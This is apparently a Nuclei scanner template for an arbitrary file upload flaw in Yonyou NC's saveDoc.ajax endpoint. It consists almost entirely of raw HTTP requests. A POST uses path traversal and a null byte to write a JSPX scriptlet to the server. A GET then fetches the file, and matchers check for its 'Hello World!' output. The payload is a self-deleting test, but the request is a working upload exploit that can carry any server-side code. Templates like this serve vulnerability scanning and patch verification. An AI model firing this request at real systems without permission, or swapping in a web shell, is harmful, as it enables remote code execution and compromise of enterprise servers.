id: yongyouOA-saveDoc-ajax-file-upload

info:
  name: 用友NC-saveDoc.ajax存在任意文件上传漏洞
  author: cnaq
  severity: critical  
  description: 用友NC-saveDoc.ajax存在任意文件上传漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BNC-saveDoc.ajax%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: yongyouOA,file,upload 

requests:
  - raw:
      - |
        POST /uapws/saveDoc.ajax?ws=/../../test3edc2.jspx%00 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
        Content-Type: application/x-www-form-urlencoded

        content=<hi xmlns:hi="http://java.sun.com/JSP/Page">
              <hi:directive.page import="java.util.*,java.io.*,java.net.*"/>
          <hi:scriptlet>
                    out.println("Hello World!");new java.io.File(application.getRealPath(request.getServletPath())).delete(); 
          </hi:scriptlet>
        </hi>

      - |
        GET /uapws/test3edc2.jspx HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'
      - type: regex
        part: body
        regex:
          - 'Hello World!'